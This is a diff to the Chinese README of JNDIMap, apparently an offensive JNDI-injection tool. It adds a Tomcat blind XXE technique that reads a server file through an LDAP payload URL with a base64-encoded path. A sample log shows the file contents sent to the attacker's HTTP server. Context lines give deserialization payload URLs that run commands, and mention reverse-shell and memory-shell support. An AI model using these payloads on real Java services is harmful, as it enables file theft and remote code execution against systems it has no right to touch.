@@ -448,6 +448,28 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: 显示 Usage 信息
 
+## Tomcat Blind XXE
+
+利用 `org.apache.catalina.users.MemoryUserDatabaseFactory` 实现无回显 XXE
+
+传入的 Path 必须为 Base64 URL 格式
+
+```bash
+# Tomcat XXE
+ldap://127.0.0.1:1389/TomcatXXE/<base64-url-encoded-path>
+```
+
+因为 JDK 限制, 通过 XXE 仅能读取单行且不包含特殊字符的文件, 文件内容会以 `content` 参数的形式发送至内置的 HTTP 服务器
+
+```bash
+[LDAP] Received query: /TomcatXXE/L3RtcC90ZXN0LnR4dA==
+[TomcatXXE] Path: /tmp/test.txt
+[LDAP] Sending Reference object (serialized data)
+[HTTP] Receive request: /O5GPr0d7.xml
+[HTTP] Receive request: /TsBaggdL.dtd
+[HTTP] Receive request: /V4J4ZH1P?content=helloworld
+```
+
 ### LDAP Deserialization
 
 通过 LDAP、LDAPS 协议触发 Java 反序列化, 不支持 RMI 协议
@@ -485,7 +507,7 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculato
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
 # CommonsBeanutils 反序列化
-# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行， 反弹 Shell， 内存马注入
+# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行, 反弹 Shell, 内存马注入
 # 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4
 
 # 1.8.3
